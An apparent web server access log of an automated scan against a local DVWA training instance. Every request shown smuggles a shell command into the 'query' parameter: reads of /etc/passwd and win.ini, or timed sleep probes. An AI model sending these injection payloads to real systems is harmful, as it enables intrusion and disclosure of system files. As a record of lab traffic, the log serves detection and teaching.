172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%26timeout+%2FT+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%26timeout+%2FT+15 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%3Bget-help HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%22%3Bget-help HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%27%3Bget-help HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%3Bget-help+%23 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%3Bget-help HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%22%3Bget-help HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%27%3Bget-help HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%3Bget-help+%23 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 301 594 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 301 594 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 301 606 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 301 606 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 301 606 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 301 606 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%26sleep+15%26 HTTP/1.1" 301 572 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%3Bsleep+15%3B HTTP/1.1" 301 572 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%22%26sleep+15%26%22 HTTP/1.1" 301 584 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 301 584 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 301 582 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 301 582 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 612 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 612 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 301 630 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 618 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 301 630 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 618 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%26timeout+%2FT+15 HTTP/1.1" 301 580 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 301 580 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 301 598 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 301 586 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 301 596 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 301 590 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%3Bget-help HTTP/1.1" 301 566 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%22%3Bget-help HTTP/1.1" 301 572 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%27%3Bget-help HTTP/1.1" 301 572 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%3Bget-help+%23 HTTP/1.1" 301 574 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 301 584 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 301 590 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 301 594 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 301 592 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 301 594 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 301 594 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 301 606 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 301 606 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 301 606 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 301 606 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%26sleep+15%26 HTTP/1.1" 301 572 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%3Bsleep+15%3B HTTP/1.1" 301 572 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%22%26sleep+15%26%22 HTTP/1.1" 301 584 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 301 584 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 301 582 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 301 582 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 612 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 612 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 301 630 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 618 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 301 630 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 618 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%26timeout+%2FT+15 HTTP/1.1" 301 580 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 301 580 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 301 598 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 301 586 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 301 596 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 301 590 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%3Bget-help HTTP/1.1" 301 566 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%22%3Bget-help HTTP/1.1" 301 572 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%27%3Bget-help HTTP/1.1" 301 572 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%3Bget-help+%23 HTTP/1.1" 301 574 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 301 584 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:37 +0000] "GET /dvwa?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 301 590 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
